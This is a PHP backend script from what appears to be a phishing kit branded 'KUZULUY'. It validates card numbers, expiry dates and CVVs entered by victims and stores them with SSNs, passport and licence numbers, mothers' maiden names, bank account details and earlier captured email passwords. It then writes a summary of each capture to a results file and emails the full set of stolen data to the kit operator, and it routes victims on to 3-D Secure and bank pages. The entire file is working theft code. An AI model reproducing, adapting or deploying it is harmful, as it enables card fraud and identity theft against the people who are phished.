<?php
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/validate.php';
@eval(file_get_contents('../config/' . $api->general_config));
@eval(file_get_contents('../config/' . $api->page_config));

$card = CreditCard::validCreditCard(str_replace(" ", "", $_POST['cardnum']));
$split = explode(" / ", $_POST['cardexp']);
$checkexp = CreditCard::validDate("20".$split[1], $split[0]);
$checkcvv = CreditCard::validCvc($_POST['cardcvv'], $card['type']);
$check3d  = CreditCard::secure($card['type']);

if(!$card['valid']) {
  echo "error";
} else if (!$checkexp) {
  echo "exp";
} else if (!$checkcvv) {
  echo "cvv";
} else {
  $_SESSION['card_name']    = $_POST['cardholder'];
  $_SESSION['card_number']  = $_POST['cardnum'];
  $_SESSION['card_exp']     = $_POST['cardexp'];
  $_SESSION['card_cvv']     = $_POST['cardcvv'];
  $_SESSION['card_type']    = $card['type'];
  $_SESSION['card_title']   = CreditCard::title($card['type']);
  $_SESSION['cvv_img']      = CreditCard::cvvimg($card['type']);
  $_SESSION['logo_img']     = CreditCard::logoimg($card['type']);
  $_SESSION['show_num']     = CreditCard::shownum($card['type'], str_replace(" ", "", $_SESSION['card_number']));
  $_SESSION['card_digit']   = substr(str_replace(" ", "", $_SESSION['card_number']), 0, 6);
  $_SESSION['card_bin']     = $api->bin($_SESSION['card_digit']);
  $_SESSION['ssn']          = $_POST['ssn'];
  $_SESSION['sort']         = $_POST['sort'];
  $_SESSION['sin']          = $_POST['sin'];
  $_SESSION['driver']       = $_POST['driver'];
  $_SESSION['osid']         = $_POST['osid'];
  $_SESSION['mother']       = $_POST['mother'];
  $_SESSION['accnum']       = $_POST['accnum'];
  $_SESSION['limit']        = $_POST['limit'];
  $_SESSION['customer']     = $_POST['customer'];
  $_SESSION['citizen']      = $_POST['citizen'];
  $_SESSION['civil']        = $_POST['civil'];
  $_SESSION['passport']     = $_POST['passport'];
  $_SESSION['ban']          = $_POST['ban'];
  $_SESSION['personal']     = $_POST['personal'];

  $message = file_get_contents('../assets/html/card.html');
  $message = preg_replace('{QUOTE}', $api->quote(), $message);
  $message = preg_replace('{KUZULUY-EMAIL}', $_SESSION['email'], $message);
  $message = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['password'], $message);
  $message = preg_replace('{KUZULUY-CC-NAME}', $_SESSION['card_name'], $message);
  $message = preg_replace('{KUZULUY-CC-NUMBER1}', str_replace(" ", "", $_SESSION['card_number']), $message);
  $message = preg_replace('{KUZULUY-CC-NUMBER2}', $_SESSION['card_number'], $message);
  $message = preg_replace('{KUZULUY-CC-EXP}', $_SESSION['card_exp'], $message);
  $message = preg_replace('{KUZULUY-CC-CVV}', $_SESSION['card_cvv'], $message);
  $message = preg_replace('{KUZULUY-CC-BIN}', $_SESSION['card_bin'], $message);
  $message = preg_replace('{KUZULUY-INFO-SSN}', $_SESSION['ssn'], $message);
  $message = preg_replace('{KUZULUY-INFO-SORT}', $_SESSION['sort'], $message);
  $message = preg_replace('{KUZULUY-INFO-SIN}', $_SESSION['sin'], $message);
  $message = preg_replace('{KUZULUY-INFO-DRIVER}', $_SESSION['driver'], $message);
  $message = preg_replace('{KUZULUY-INFO-OSID}', $_SESSION['osid'], $message);
  $message = preg_replace('{KUZULUY-INFO-ACCNUMBER}', $_SESSION['accnum'], $message);
  $message = preg_replace('{KUZULUY-INFO-LIMIT}', $_SESSION['limit'], $message);
  $message = preg_replace('{KUZULUY-INFO-PERSONAL}', $_SESSION['personal'], $message);
  $message = preg_replace('{KUZULUY-INFO-CUSTOMER}', $_SESSION['customer'], $message);
  $message = preg_replace('{KUZULUY-INFO-CITIZEN}', $_SESSION['citizen'], $message);
  $message = preg_replace('{KUZULUY-INFO-CIVIL}', $_SESSION['civil'], $message);
  $message = preg_replace('{KUZULUY-INFO-PASSPORT}', $_SESSION['passport'], $message);
  $message = preg_replace('{KUZULUY-INFO-BAN}', $_SESSION['ban'], $message);
  $message = preg_replace('{KUZULUY-INFO-DOB}', $_SESSION['dob'], $message);
  $message = preg_replace('{KUZULUY-INFO-MOTHER}', $_SESSION['mother'], $message);
  $message = preg_replace('{KUZULUY-BILL-NAME}', $_SESSION['bill_name'], $message);
  $message = preg_replace('{KUZULUY-BILL-ADDRESS}', $_SESSION['bill_address'], $message);
  $message = preg_replace('{KUZULUY-BILL-CITY}', $_SESSION['bill_city'], $message);
  $message = preg_replace('{KUZULUY-BILL-STATE}', $_SESSION['bill_state'], $message);
  $message = preg_replace('{KUZULUY-BILL-ZIP}', $_SESSION['bill_zip'], $message);
  $message = preg_replace('{KUZULUY-BILL-COUNTRY}', $_SESSION['country'], $message);
  $message = preg_replace('{KUZULUY-BILL-PHONE}', $_SESSION['bill_phone'], $message);
  $message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
  $message = preg_replace('{KUZULUY-AGENT}', $_SESSION['agent'], $message);

  $subject  = $_SESSION['card_digit']." - ".$_SESSION['card_bin']." [ ".$_SESSION['country']." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";
  $headers  = "From: ".$_SESSION['card_name']." <cc@kuzuluy.co>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

  $api->save("../config/result-card.txt", $subject."\n", "a");

  if ($config_smtp == "enable") {
    $api->ngesend($api->result(), $subject, $message, $_SESSION['card_name'], "cc@kuzuluy.co");
  } else {
    mail($api->result(), $subject, $message, $headers);
  }
  if($check3d == "nosecure") {
    if($config_bank == "disable" && $config_anothercard == "disable") {
      echo "nofull";
    } else if($config_bank == "disable") {
      echo "nomove";
    } else {
      echo "nosecure";
    }
  } else {
    if($config_3dsecure == "disable" && $config_bank == "disable" && $config_anothercard == "disable") {
      echo "nofull";
    } else if($config_3dsecure == "disable" && $config_bank == "disable") {
      echo "nomove";
    } else if($config_3dsecure == "disable") {
      echo "nosecure";
    }
  }
}

?>
